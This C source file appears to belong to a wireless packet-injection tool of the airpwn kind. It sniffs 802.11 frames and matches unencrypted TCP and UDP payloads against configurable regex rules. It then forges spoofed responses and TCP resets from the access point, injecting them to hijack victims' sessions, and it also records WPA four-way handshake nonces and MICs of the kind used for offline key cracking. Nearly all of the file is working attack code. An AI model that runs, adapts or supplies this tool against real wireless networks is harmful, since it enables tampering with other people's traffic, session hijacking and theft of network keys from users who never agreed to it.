#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <unistd.h>
#include <signal.h>

#include <netinet/in.h>
#include <arpa/inet.h>

#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>

#include <arpa/nameser.h>
#include <resolv.h>

#include "logger.h"
#include "matchers.h"

#include "lrc.h"
#include "ap.h"

int dead = 0;
int debugged = 0; 

void usage(char *argv[]) {
    printf("usage: %s -k <matchers file> [options]", argv[0]);
    printf("\nInterface options:\n");
    printf("\t-i <iface> : sets the listen/inject interface\n");
    printf("\t-m <iface> : sets the monitor interface\n");
    printf("\t-j <iface> : sets the inject interface\n");
    printf("\t-c <channels> : sets the channels for hopping(or not, if fix defined)\n");
    printf("\t-t <time> : hop sleep time in sec(default = 5 sec)\n");
    printf("\t-k <file> : file describing configuration for matchers\n");
    printf("\t-l <file> : log to this file instead of stdout\n");
    printf("\t-u <mtu> : set MTU size(default 1400)\n");
    printf("\t-d : enable debug messages\n");
    printf("\t-f : fix channel, this will disable hopping and starts to always use first channel in list\n");
    printf("\n");
    printf("Example(for single interface): %s -i wlan0 -c 1,6,11\n", argv[0]);
    printf("Example(for dual interfaces): %s -m wlan0 -j wlan1 -c 1,6,11\n", argv[0]);
    printf("Example(for single interface and channel fix): %s -i wlan0 -c 9 -f\n", argv[0]);
    printf("\n");
    exit(0);
}

void sig_handler(int sig) {

    signal(sig, SIG_IGN);

    switch(sig) {
    case SIGINT:
        dead = 1;
        (void) fprintf(stderr, "Got Ctrl+C, ending threads...%d sec alarm time\n", ALRM_TIME);
        signal(SIGALRM, sig_handler);
        alarm(ALRM_TIME);
        break;
    case SIGALRM:
        exit(0);
        break;
    }
}

void hexdump (void *addr, u_int len) {
    u_int i;
    u_char buff[17];
    u_char *pc = addr;

    // Process every byte in the data.
    for (i = 0; i < len; i++) {
        // Multiple of 16 means new line (with line offset).

        if ((i % 16) == 0) {
            // Just don't print ASCII for the zeroth line.
            if (i != 0) {
                printf("  %s\n", buff);
            }
            // Output the offset.
            printf("  %04x ", i);
        }

        // Now the hex code for the specific character.
        printf (" %02x", pc[i]);
        // And store a printable ASCII character for later.
        if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
            buff[i % 16] = '.';
        } else {
            buff[i % 16] = pc[i];
        }
        buff[(i % 16) + 1] = '\0';
    }

    // Pad out last line if not exactly 16 characters.
    while ((i % 16) != 0) {
        printf ("   ");
        i++;
    }
    // And print the final ASCII bit.
    printf ("  %s\n", buff);
}

struct matcher_entry *matchers_match(const char *data, int datalen, struct ctx *ctx, u_int proto, u_int src_port, u_int dst_port) {
    struct matcher_entry *matcher;
    int ovector[30];

    for(matcher = ctx->matchers_list; matcher != NULL; matcher = matcher->next) {
        if(matcher->proto != MATCHER_PROTO_ANY && matcher->proto != proto) {
            continue;
        }
        if((matcher->dst_port > 0 && matcher->dst_port != dst_port) || (matcher->src_port > 0 && matcher->src_port != src_port)) {
            continue;
        }
        if(pcre_exec(matcher->match, NULL, data, datalen,  0, 0, ovector, 30) > 0) {
            logger(INFO, "Matched pattern for '%s'", matcher->name);
            if(matcher->ignore && pcre_exec(matcher->ignore, NULL, data, datalen, 0, 0, ovector, 30) > 0) {
                logger(INFO, "Matched ignore for '%s'", matcher->name);
                continue;
            } else {
                return matcher;
            }
        }
    }
    return NULL;
}

struct matcher_entry *get_response(u_char *data, u_int datalen, struct ctx *ctx, u_int type, u_int src_port, u_int dst_port) {

    struct matcher_entry *matcher;

    #ifdef HAVE_PYTHON
    PyObject *args;
    PyObject *value;
    Py_ssize_t rdatalen;
    char *rdata;
    #endif

    if(!(matcher = matchers_match((const char *)data, datalen, ctx, type, src_port, dst_port))) {
        logger(DBG, "No matchers found for data");
        return NULL;
    }

    #ifdef HAVE_PYTHON
    if(matcher->pyfunc) {
        logger(DBG, "We have a Python code to construct response");
        args = PyTuple_New(2);
        PyTuple_SetItem(args,0,PyString_FromStringAndSize((const char *)data, datalen)); // here is data
        PyTuple_SetItem(args,1,PyInt_FromSsize_t(datalen));

        value = PyObject_CallObject(matcher->pyfunc, args);
        if(value == NULL) {
            PyErr_Print();
            logger(WARN, "Python function returns no data!");
            return NULL;
        }

        rdata = PyString_AsString(value);
        rdatalen = PyString_Size(value);

        if(rdata != NULL && rdatalen > 0) {
            matcher->response_len = (u_int) rdatalen;
            if(matcher->response) {
                // We already have previous response, free it
                free(matcher->response);
            }
            matcher->response = malloc(matcher->response_len);
            memcpy(matcher->response, (u_char *) rdata, rdatalen);
        } else {
            PyErr_Print();
            logger(WARN, "Python cannot convert return string");
            return NULL;
        }
        return matcher;
    }
    #endif
    
    if(matcher->response) {
        logger(DBG, "We have a plain text response");
        return matcher;
    }

    logger(WARN, "There is no response data!");
    return NULL;

}

int build_tcp_packet(struct iphdr *ip_hdr, struct tcphdr *tcp_hdr, u_char *data, u_int datalen, u_int tcpflags, u_int seqnum, struct ctx *ctx) {

    // libnet wants the data in host-byte-order
    ctx->lnet_p_tcp = libnet_build_tcp(
                ntohs(tcp_hdr->dest), // source port
                ntohs(tcp_hdr->source), // dest port
                seqnum, // sequence number
                ntohl(tcp_hdr->seq) + ( ntohs(ip_hdr->tot_len) - ip_hdr->ihl * 4 - tcp_hdr->doff * 4 ), // ack number
                tcpflags, // tcp flags
                0xffff, // window size
                0, // checksum, libnet will autofill it
                0, // urg ptr
                LIBNET_TCP_H + datalen, // total length of the TCP packet
                (u_char *)data, // response
                datalen, // response_length
                ctx->lnet, // libnet_t pointer
                ctx->lnet_p_tcp // protocol tag
            );

    if(ctx->lnet_p_tcp == -1) {
        logger(WARN, "libnet_build_tcp returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    ctx->lnet_p_ip = libnet_build_ipv4(
                LIBNET_TCP_H + LIBNET_IPV4_H + datalen, // total length of IP packet
                0, // TOS bits, type of service
                1, // IPID identification number (need to calculate)
                0, // fragmentation offset
                0xff, // TTL time to live
                IPPROTO_TCP, // upper layer protocol
                0, // checksum, libnet will autofill it
                ip_hdr->daddr, // source IPV4 address
                ip_hdr->saddr, // dest IPV4 address
                NULL, // response, no payload
                0, // response length
                ctx->lnet, // libnet_t pointer
                ctx->lnet_p_ip // protocol tag
            );

    if(ctx->lnet_p_ip == -1) {
        logger(WARN, "libnet_build_ipv4 returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    return 1;
}

int build_udp_packet(struct iphdr *ip_hdr, struct udphdr *udp_hdr, u_char *data, u_int datalen, struct ctx *ctx) {

    ctx->lnet_p_udp = libnet_build_udp(
                ntohs(udp_hdr->source), // source port
                ntohs(udp_hdr->dest), // destination port
                LIBNET_UDP_H + datalen, // total length of the UDP packet
                0, // libnet will autofill the checksum
                NULL, // payload
                0, // payload length
                ctx->lnet, // pointer to libnet context
                ctx->lnet_p_udp // protocol tag for udp
            );
    if(ctx->lnet_p_udp == -1) {
        logger(WARN, "libnet_build_tcp returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    ctx->lnet_p_ip = libnet_build_ipv4(
                LIBNET_UDP_H + LIBNET_IPV4_H + datalen, // total length of IP packet
                0, // TOS bits, type of service
                1, // IPID identification number (need to calculate)
                0, // fragmentation offset
                0xff, // TTL time to live
                IPPROTO_UDP, // upper layer protocol
                0, // checksum, libnet will autofill it
                ip_hdr->daddr, // source IPV4 address
                ip_hdr->saddr, // dest IPV4 address
                NULL, // response, no payload
                0, // response length
                ctx->lnet, // libnet_t pointer
                ctx->lnet_p_ip // protocol tag=0, build new
            );

    if(ctx->lnet_p_ip == -1) {
        logger(WARN, "libnet_build_ipv4 returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    return 1;
}

u_short fnseq(u_short fn, u_short seq) {
    
    u_short r = 0;

    r = fn;
    r |= ((seq % 4096) << IEEE80211_SEQ_SEQ_SHIFT);
    return htole16(r);
}

int build_dot11_packet(u_char *l2data, u_int l2datalen, u_char *wldata, u_int *wldatalen, struct ieee80211_frame *wh_old, struct ctx *ctx) {

    struct ieee80211_frame *wh = (struct ieee80211_frame*) wldata;

    u_char *data = (u_char*) (wh+1);
    u_short *sp;

    *wldatalen = sizeof(struct ieee80211_frame);
    
    /* duration */
    sp = (u_short*) wh->i_dur;
    //*sp = htole16(32767);
    *sp = htole16(48); // set duration to 48 microseconds. Why 48? Cause we do not care about this field :)
    
    /* seq */
    sp = (u_short*) wh->i_seq;
    *sp = fnseq(0, 1337); // We do not care about this field value too.

    wh->i_fc[0] |= IEEE80211_FC0_TYPE_DATA | IEEE80211_FC0_SUBTYPE_DATA;
    wh->i_fc[1] |= IEEE80211_FC1_DIR_FROMDS;

    memcpy(wh->i_addr1, wh_old->i_addr2, 6);
    memcpy(wh->i_addr2, wh_old->i_addr1, 6);
    memcpy(wh->i_addr3, wh_old->i_addr3, 6);

    // LLC IP fill
    memcpy(data, "\xAA\xAA\x03\x00\x00\x00\x08\x00", 8);
    data += 8;
    *wldatalen +=8;

    memcpy(data, l2data, l2datalen);    
    *wldatalen += l2datalen;

    return 1;

}

int send_packet(struct ieee80211_frame *wh, struct ctx *ctx) {
    
    u_char *l2data;
    u_int l2datalen;

    u_char wldata[2048];
    u_int wldatalen;

    int rc;

    memset(wldata, 0, sizeof(wldata));

    // cull_packet will dump the packet (with correct checksums) into a
    // buffer for us to send via the raw socket. memory must be freed after that
    if(libnet_adv_cull_packet(ctx->lnet, &l2data, &l2datalen) == -1) {
        logger(WARN, "libnet_adv_cull_packet returns error: %s", libnet_geterror(ctx->lnet));
        return 0;
    }

    if(build_dot11_packet(l2data, l2datalen, wldata, &wldatalen, wh,  ctx)) {
        rc = wi_write(ctx->wi_inj, wldata, wldatalen, NULL);
        if(rc == -1) {
            printf("wi_write() error\n");
        }
    }

    libnet_adv_free_packet(ctx->lnet, l2data);

    return 1;
}

void clear_packet(struct ctx *ctx) {
    if(ctx->lnet) {
        libnet_clear_packet(ctx->lnet);
        ctx->lnet_p_ip = LIBNET_PTAG_INITIALIZER;
        ctx->lnet_p_tcp = LIBNET_PTAG_INITIALIZER;
        ctx->lnet_p_udp = LIBNET_PTAG_INITIALIZER;
    }
}

void ip_packet_process(const u_char *dot3, u_int dot3_len, struct ieee80211_frame *wh, struct ctx *ctx) {

    struct iphdr *ip_hdr;
    struct tcphdr *tcp_hdr;
    struct udphdr *udp_hdr;
    struct icmphdr *icmp_hdr;

    u_char *tcp_data;
    u_int tcp_datalen;

    u_char *udp_data;
    u_int udp_datalen;

    struct matcher_entry *matcher;

    char dst_ip[16];
    char src_ip[16];

    int frag_offset;
    int frag_len;

    u_int tcpseqnum;
    u_int tcpflags;

    /* Calculate the size of the IP Header. ip_hdr->ihl contains the number of 32 bit
    words that represent the header size. Therfore to get the number of bytes
    multiple this number by 4 */

    ip_hdr = (struct iphdr *) (dot3);

    memcpy(&src_ip, inet_ntoa(*((struct in_addr *) &ip_hdr->saddr)), sizeof(src_ip));
    memcpy(&dst_ip, inet_ntoa(*((struct in_addr *) &ip_hdr->daddr)), sizeof(dst_ip));

    logger(DBG, "IP id:%d tos:0x%x version:%d iphlen:%d dglen:%d protocol:%d ttl:%d src:%s dst:%s", ntohs(ip_hdr->id), ip_hdr->tos, ip_hdr->version, ip_hdr->ihl*4, ntohs(ip_hdr->tot_len), ip_hdr->protocol, ip_hdr->ttl, src_ip, dst_ip);

    if(ntohs(ip_hdr->tot_len) > dot3_len) {
        logger(DBG, "Ambicious len in IP header, skipping");
        return;
    }

    switch (ip_hdr-> protocol) {
    case IPPROTO_TCP:
    
        /* Calculate the size of the TCP Header. tcp->doff contains the number of 32 bit
         words that represent the header size. Therfore to get the number of bytes
         multiple this number by 4 */
        tcp_hdr = (struct tcphdr *) (dot3+sizeof(struct iphdr));
        tcp_datalen = ntohs(ip_hdr->tot_len) - (ip_hdr->ihl * 4) - (tcp_hdr->doff * 4);
        logger(DBG, "TCP src_port:%d dest_port:%d doff:%d datalen:%d win:0x%x ack:%d seq:%d", ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest), tcp_hdr->doff*4, tcp_datalen, ntohs(tcp_hdr->window), ntohl(tcp_hdr->ack_seq), ntohs(tcp_hdr->seq));
        logger(DBG, "TCP FLAGS %c%c%c%c%c%c",
               (tcp_hdr->urg ? 'U' : '*'),
               (tcp_hdr->ack ? 'A' : '*'),
               (tcp_hdr->psh ? 'P' : '*'),
               (tcp_hdr->rst ? 'R' : '*'),
               (tcp_hdr->syn ? 'S' : '*'),
               (tcp_hdr->fin ? 'F' : '*'));

        // make sure the packet isn't empty..
        if(tcp_datalen <= 0) {
            logger(DBG, "TCP datalen <= 0, ignoring it");
            break;
        }
        tcp_data = (u_char*) tcp_hdr + tcp_hdr->doff * 4;

        if((matcher = get_response(tcp_data, tcp_datalen, ctx, MATCHER_PROTO_TCP, ntohs(tcp_hdr->source), ntohs(tcp_hdr->dest)))) {
            logger(INFO, "Matched %s TCP packet %s:%d -> %s:%d len:%d", matcher->name, src_ip, ntohs(tcp_hdr->source), dst_ip, ntohs(tcp_hdr->dest), tcp_datalen);

            tcpseqnum = ntohl(tcp_hdr->ack_seq);
            for(frag_offset = 0; frag_offset < matcher->response_len; frag_offset += ctx->mtu) {

                frag_len = matcher->response_len - frag_offset;
                if(frag_len > ctx->mtu) {
                    frag_len = ctx->mtu;
                }

                if((frag_offset + ctx->mtu) > matcher->response_len) {
                    tcpflags = TH_PUSH | TH_ACK;
                } else {
                    tcpflags = TH_ACK;
                }

                if(!build_tcp_packet(ip_hdr, tcp_hdr, matcher->response + frag_offset, frag_len, tcpflags, tcpseqnum, ctx)) {
                    logger(WARN, "Fail to build TCP packet");
                    // clear packet?
                    break;
                }
                tcpseqnum = tcpseqnum + frag_len;

                if(!send_packet(wh, ctx)) {
                    logger(WARN, "Cannot inject TCP packet");
                }
            }
            logger(INFO, "TCP packet successfully injected. response_len: %d", matcher->response_len);

            // reset packet handling
            if(matcher->options & MATCHER_OPTION_RESET) {
                if(!build_tcp_packet(ip_hdr, tcp_hdr, NULL, 0, TH_RST | TH_ACK, tcpseqnum, ctx)) {
                    logger(WARN, "Fail to build TCP reset packet");
                    // clear packet?
                    break;
                }
                if(!send_packet(wh, ctx)) {
                    logger(WARN, "Cannot inject TCP reset packet");
                }
                logger(INFO, "TCP reset packet successfully injected");
            }
            
            clear_packet(ctx);
        }
        break;
    case IPPROTO_UDP:
        udp_hdr = (struct udphdr *) (dot3+sizeof(struct iphdr));
        udp_datalen = ntohs(udp_hdr->len) - sizeof(struct udphdr);
        logger(DBG, "UDP src_port:%d dst_port:%d len:%d", ntohs(udp_hdr->source), ntohs(udp_hdr->dest), udp_datalen);

        // make sure the packet isn't empty..
        if(udp_datalen <= 0) {
            logger(DBG, "UDP datalen <= 0, ignoring it");
            break;
        }
        udp_data = (u_char*) udp_hdr + sizeof(struct udphdr);

        if((matcher = get_response(udp_data, udp_datalen, ctx, MATCHER_PROTO_UDP, ntohs(udp_hdr->source), ntohs(udp_hdr->dest)))) {
            logger(INFO, "Matched %s UDP packet %s:%d -> %s:%d len:%d", matcher->name, src_ip, ntohs(udp_hdr->source), dst_ip, ntohs(udp_hdr->dest), udp_datalen);

            for(frag_offset = 0; frag_offset < matcher->response_len; frag_offset += ctx->mtu) {

                frag_len = matcher->response_len - frag_offset;
                if(frag_len > ctx->mtu) {
                    frag_len = ctx->mtu;
                }

                if(!build_udp_packet(ip_hdr, udp_hdr, matcher->response + frag_offset, frag_len, ctx)) {
                    logger(WARN, "Fail to build UDP packet");
                    // clear packet?
                    break;
                }
                if(!send_packet(wh, ctx)) {
                    logger(WARN, "Cannot inject UDP packet");
                }
            }
            logger(INFO, "UDP packet successfully injected. response_len: %d", matcher->response_len);

            // UDP "reset" packet handling, just send an empty UDP packet
            if(matcher->options & MATCHER_OPTION_RESET) {
                logger(INFO, "UDP reset packet sending");
                if(!build_udp_packet(ip_hdr, udp_hdr, NULL, 0, ctx)) {
                    logger(WARN, "Fail to build UDP reset packet");
                    // clear packet?
                    break;
                }

                if(!send_packet(wh, ctx)) {
                    logger(WARN, "Cannot inject UDP reset packet");
                }

                logger(INFO, "UDP reset packet successfully injected");
            }
            clear_packet(ctx);
        }

        // do nothing
        break;

    case IPPROTO_ICMP:
        icmp_hdr = (struct icmphdr *) (dot3+sizeof(struct iphdr));
        //memcpy(&id, (u_char*)icmphdr+4, 2);
        //memcpy(&seq, (u_char*)icmphdr+6, 2);
        logger(DBG, "ICMP type:%d code:%d", icmp_hdr->type, icmp_hdr->code);
        break;
    }
}


int parse_rsn(unsigned char *p, int len, int rsn) {               
    int c;  
    unsigned char *start = p;
    int psk = 0;

    if (len < 2) {
        return 0;
    }
        
    if (memcmp(p, "\x01\x00", 2) != 0) {
        return 0;
    }
    
    if (len < 8) {
        return 0;
    }
    
    p += 2;
    p += 4; 

    /* cipher */
    c = le16toh(*((uint16_t*) p));
                        
    p += 2 + 4 * c;     
                    
    if (len < ((p - start) + 2)) {
        return 0;
    }

    /* auth */
    c = le16toh(*((uint16_t*) p));
    p += 2;

    if (len < ((p - start) + c * 4)) {
        return 0;
    }

    while (c--) {
        if (rsn && memcmp(p, "\x00\x0f\xac\x02", 4) == 0) {
            psk++;
        }

        if (!rsn && memcmp(p, "\x00\x50\xf2\x02", 4) == 0) {
            psk++;
        }
        p += 4;
    }
    
    if (!psk) {
        return CRYPT_TYPE_WPA_MGT;
    } else {
        return CRYPT_TYPE_WPA;
    }
}

int parse_elem_vendor(unsigned char *e, int l) {       
    struct ieee80211_ie_wpa *wpa = (struct ieee80211_ie_wpa*) e;

    if (l < 5) {
        return 0;
    }

    if (memcmp(wpa->wpa_oui, "\x00\x50\xf2", 3) != 0) {
        return 0;
    }

    if (l < 8) {
        return 0;
    }

    if (wpa->wpa_type != WPA_OUI_TYPE) {
        return 0;
    }

    return parse_rsn((unsigned char*) &wpa->wpa_version, l - 6, 0);
}



void dot11_beacon_process(struct ctx *ctx, struct ieee80211_frame *wh, int len) {

    ieee80211_mgt_beacon_t wb = (ieee80211_mgt_beacon_t) (wh+1);
    int fix_len = 12; // fixed parameters length
    int rc;

    int ie_type;
    u_char ie_len;
    char ssid[MAX_IE_ELEMENT_SIZE];
    int channel;
    int crypt_type = CRYPT_TYPE_OPEN;
    int got_ssid = 0, got_channel = 0;
    
    uint8_t *bssid = wh->i_addr3;
    
    // skip wh header len
    len -= sizeof(*wh);

    if((IEEE80211_BEACON_CAPABILITY(wb) & IEEE80211_CAPINFO_PRIVACY)) {
        crypt_type = CRYPT_TYPE_WEP;
    }
    
    wb += fix_len; // skip fixed params
    len -= fix_len;

    if(len < 0) {
        logger(WARN, "Too short beacon frame");
        return;
    }

    // let`s parse tagged params
    while (len > 1) {

        ie_type = wb[0];
        ie_len = wb[1];

        switch (ie_type) {
            case IEEE80211_ELEMID_SSID:
                if (!got_ssid) {
                    if(ie_len > 0) {
                        strncpy(ssid, (char*) &wb[2], ie_len);
                        ssid[ie_len] = '\0';
                    } else { //hidden ssid
                        ssid[0] = '\0';
                    }
                    got_ssid = 1;
                } 
                break;
            case IEEE80211_ELEMID_DSPARMS:
                if (!got_channel)
                    channel = wb[2];
                    got_channel = 1;
                break;
        
            case IEEE80211_ELEMID_VENDOR:
                if((rc = parse_elem_vendor(wb, ie_len + 2))) {
                    crypt_type = rc;
                }
                break;

            case IEEE80211_ELEMID_RSN:
                if((rc = parse_rsn(&wb[2], ie_len, 1))) {
                    crypt_type = rc;
                }
                break;
        }

        wb += 2 + ie_len;
        len -= 2 + ie_len;
         
    }

    if (got_ssid && got_channel) {
        logger(DBG, "SSID: %s Channel: %d", ssid, channel);
        switch(crypt_type) {
            case CRYPT_TYPE_WEP:
                logger(DBG, "Crypt: WEP");
                break;
            case CRYPT_TYPE_WPA:
                logger(DBG, "Crypt: WPA");
                break;
            case CRYPT_TYPE_WPA_MGT:
                logger(DBG, "Crypt: WPA-MGT");
                break;
            case CRYPT_TYPE_OPEN:
                logger(DBG, "Crypt: OPEN");
                break;
            default:
                logger(WARN, "Cannot determine crypt type");
                break;
        }

        ap_add(ctx, bssid, ssid, crypt_type);
    }
}

void dot11_mgt_process(struct ctx *ctx, struct ieee80211_frame *wh, int len) {

    if (len < (int) sizeof(*wh)) {
        logger(DBG, "802.11 too short management packet: %d, skipping it", len);
        return;
    }
    switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {

        // Beacons and Probe responses contains SSID and other useful information about AP
        case IEEE80211_FC0_SUBTYPE_BEACON:
        case IEEE80211_FC0_SUBTYPE_PROBE_RESP:
            logger(DBG, "Management beacon or probe response frame");
            dot11_beacon_process(ctx, wh, len);
            break;

        case IEEE80211_FC0_SUBTYPE_AUTH:
            logger(DBG, "Management auth frame");
            break;

        case IEEE80211_FC0_SUBTYPE_PROBE_REQ:
        case IEEE80211_FC0_SUBTYPE_ASSOC_REQ:
            // TODO extract info from this frames. They can be useful.
            logger(DBG, "Management probe request or association frame.");
            break;

        case IEEE80211_FC0_SUBTYPE_DEAUTH:
            logger(DBG, "Management deauth frame");
            break;

        case IEEE80211_FC0_SUBTYPE_DISASSOC:
            logger(DBG, "Management dissassociation frame");
            break;

        case IEEE80211_FC0_SUBTYPE_ASSOC_RESP:
            logger(DBG, "Management association response frame");
            break;

        default:
            logger(DBG, "Unknown mgmt subtype 0x%02X", wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK);
        break;
    }    
    
}

void dot11_ctl_process(struct ctx *ctx, struct ieee80211_frame *wh, int len) {
    switch (wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK) {
        case IEEE80211_FC0_SUBTYPE_ACK:
            logger(DBG, "Control ask frame");
            break;

        case IEEE80211_FC0_SUBTYPE_RTS:
        case IEEE80211_FC0_SUBTYPE_CTS:
        case IEEE80211_FC0_SUBTYPE_PS_POLL:
        case IEEE80211_FC0_SUBTYPE_CF_END:
        case IEEE80211_FC0_SUBTYPE_ATIM:
            logger(DBG, "Control rts/cts/ps/cf/atim frame");
            break;

        default:
            logger(DBG, "Unknown ctl subtype %x", wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK);
            break;
    }
}

void eapol_wpa_process(struct ctx *ctx, u_char *p, int len, struct sta_info *sta_cur) {
    /* frame 1: Pairwise == 1, Install == 0, Ack == 1, MIC == 0 */
    if ((p[6] & 0x08) != 0 && (p[6] & 0x40) == 0 && (p[6] & 0x80) != 0 && (p[5] & 0x01) == 0) {
        memcpy (sta_cur->wpa.anonce, &p[17], 32);
        sta_cur->wpa.state = 1;
        logger(INFO, "EAPOL step 1 done");
    }
    /* frame 2 or 4: Pairwise == 1, Install == 0, Ack == 0, MIC == 1 */
    if ((p[6] & 0x08) != 0 && (p[6] & 0x40) == 0 && (p[6] & 0x80) == 0 && (p[5] & 0x01) != 0 && sta_cur->wpa.state != EAPOL_STATE_COMPLETE) {
        if (memcmp (&p[17], ZERO, 32) != 0) {
            memcpy (sta_cur->wpa.snonce, &p[17], 32);
            sta_cur->wpa.state |= 2;
            logger(INFO, "EAPOL step 2 done");
        }

        if ((sta_cur->wpa.state & 4) != 4) {
            sta_cur->wpa.eapol_size = (p[2] << 8) + p[3] + 4;
            if(len < sta_cur->wpa.eapol_size || sta_cur->wpa.eapol_size == 0 ) {
                // Ignore the packet trying to crash us.
                return;
            }

            memcpy (sta_cur->wpa.keymic, &p[81], 16);
            memcpy (sta_cur->wpa.eapol, &p, sta_cur->wpa.eapol_size);
            memset (sta_cur->wpa.eapol + 81, 0, 16);
            sta_cur->wpa.state |= 4;
            sta_cur->wpa.keyver = p[6] & 7;
            logger(INFO, "EAPOL step 4 done");
        }
    }
    /* frame 3: Pairwise == 1, Install == 1, Ack == 1, MIC == 1 */
    if ((p[6] & 0x08) != 0 && (p[6] & 0x40) != 0 && (p[6] & 0x80) != 0 && (p[5] & 0x01) != 0) {
        if (memcmp (&p[17], ZERO, 32) != 0) {
            memcpy (sta_cur->wpa.anonce, &p[17], 32);
            sta_cur->wpa.state |= 1;
            logger(INFO, "EAPOL step 3 done");
        }
        if ((sta_cur->wpa.state & 4) != 4) {
            sta_cur->wpa.eapol_size = (p[2] << 8) + p[3] + 4;
            if(len < sta_cur->wpa.eapol_size || sta_cur->wpa.eapol_size == 0 ) {
                // Ignore the packet trying to crash us.
                return;
            }
            memcpy (sta_cur->wpa.keymic, &p[81], 16);
            memcpy (sta_cur->wpa.eapol, &p, sta_cur->wpa.eapol_size);
            memset (sta_cur->wpa.eapol + 81, 0, 16);
            sta_cur->wpa.state |= 4;
            sta_cur->wpa.keyver = p[6] & 7;
            logger(INFO, "EAPOL step 4 done");
        }
    }

    if (sta_cur->wpa.state == EAPOL_STATE_COMPLETE) {
        memcpy (sta_cur->wpa.stmac, sta_cur->sta_mac, 6);
        logger(INFO, "WPA handshake complete");
    }
}

void dot11_data_process(struct ctx *ctx, struct ieee80211_frame *wh, int len) {

    u_char *p = (u_char*) (wh + 1);
    int protected = wh->i_fc[1] & IEEE80211_FC1_WEP;
    int stype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;
    uint8_t *bssid, *sta_mac;

    struct ap_info *ap_cur = NULL;
    struct sta_info *sta_cur = NULL;

    // Skip 802.11 header
    len -= sizeof(*wh);
    
    // Skip QOS header
    switch(stype) {
        case IEEE80211_FC0_SUBTYPE_QOS:
        case IEEE80211_FC0_SUBTYPE_QOS_NULL:
        case IEEE80211_FC0_SUBTYPE_CF_ACK:
        case IEEE80211_FC0_SUBTYPE_CF_POLL:
        case IEEE80211_FC0_SUBTYPE_CF_ACPL:
            p += 2;
            len -= 2;
            if(wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) {
                bssid = wh->i_addr2;
                sta_mac = wh->i_addr1;
            } else {
                bssid = wh->i_addr1;
                sta_mac = wh->i_addr2;
            }
            break;
        case IEEE80211_FC0_SUBTYPE_DATA:
            if(wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS) {
                bssid = wh->i_addr2;
                sta_mac = wh->i_addr3;
            } else {
                bssid = wh->i_addr1;
                sta_mac = wh->i_addr2;
            }
            break;
        default:
            return;
    }

    if(!(ap_cur = ap_lookup(ctx, bssid))) {
        logger(INFO, "Cannot found AP [%02X:%02X:%02X:%02X:%02X:%02X] in cache, skipping", bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
        return;
    } 

    if(!(sta_cur = sta_lookup(ctx, sta_mac))) {
        sta_cur = sta_add(ctx, sta_mac);
        sta_cur->ap = ap_cur;
    } else {
        //logger(INFO, "We found STA in cache:[%02X:%02X:%02X:%02X:%02X:%02X]", sta_mac[0], sta_mac[1], sta_mac[2], sta_mac[3], sta_mac[4], sta_mac[5]);                 
    }



    // Not protected packets(without WEP flag set)
    if (!protected) {
        // Check we have LLC header(if exist)
        if(len >= LLC_SIZE && (p[0] == 0xaa && p[1] == 0xaa && p[2] == 0x03)) {

            //802.1x auth LLC
            if(memcmp(p, "\xaa\xaa\x03\x00\x00\x00\x88\x8e", LLC_SIZE) == 0) {

                p += LLC_SIZE;
                len -= LLC_SIZE; 
                
                if(len > 0 && (sta_cur->wpa.state != EAPOL_STATE_COMPLETE)) {
                    eapol_wpa_process(ctx, p, len, sta_cur);
                }

             }

             //IP layer LLC, so try to hijack it
            if(memcmp(p, "\xaa\xaa\x03\x00\x00\x00\x08\x00", LLC_SIZE) == 0) {

                p += LLC_SIZE;
                len -= LLC_SIZE;
 
                if(len > 0) {
                    ip_packet_process(p, len, wh, ctx);
                }
            }

       }
    }

    if(protected) {
        // Remove CCMP && TKIP init vector from protected packet
        if (len >= 8) {
            p += 8;
            len -= 8;
        }
    }
}

void dot11_process(u_char *pkt, int len,  struct rx_info *rxi, struct ctx *ctx) {

    struct ieee80211_frame *wh = (struct ieee80211_frame *) pkt;
    int protected = wh->i_fc[1] & IEEE80211_FC1_WEP;

    logger(DBG, "-------------------------");
    logger(DBG, "Radiotap data: ri_channel: %d, ri_power: %d, ri_noise: %d, ri_rate: %d", rxi->ri_channel, rxi->ri_power, rxi->ri_noise, rxi->ri_rate);
    logger(DBG, "IEEE802.11 frame type:0x%02X subtype:0x%02X protected:%s direction:%s receiver:[%02X:%02X:%02X:%02X:%02X:%02X] transmitter:[%02X:%02X:%02X:%02X:%02X:%02X] bssid:[%02X:%02X:%02X:%02X:%02X:%02X]",
                wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK,
                wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK,
                protected ? "y":"n",
                wh->i_fc[1] & IEEE80211_FC1_DIR_FROMDS ? "from_ds":"to_ds", // wh->i_fc[1] & IEEE80211_FC1_DIR_TODS
                wh->i_addr1[0], wh->i_addr1[1], wh->i_addr1[2], wh->i_addr1[3], wh->i_addr1[4], wh->i_addr1[5],
                wh->i_addr2[0], wh->i_addr2[1], wh->i_addr2[2], wh->i_addr2[3], wh->i_addr2[4], wh->i_addr2[5],
                wh->i_addr3[0], wh->i_addr3[1], wh->i_addr3[2], wh->i_addr3[3], wh->i_addr3[4], wh->i_addr3[5]);

    switch (wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK) {
        case IEEE80211_FC0_TYPE_MGT: // management frame
            logger(DBG, "Management frame");
            dot11_mgt_process(ctx, wh, len);
            break;

        case IEEE80211_FC0_TYPE_CTL: // control frame
            logger(DBG, "Control frame");
            dot11_ctl_process(ctx, wh, len);
            break;

        case IEEE80211_FC0_TYPE_DATA: //data frame
            logger(DBG, "Data frame");
            dot11_data_process(ctx, wh, len);
            break;
        default:
            logger(DBG, "Unknown frame type: 0x%02X", wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK);
    }


}


// Man packet read loop.
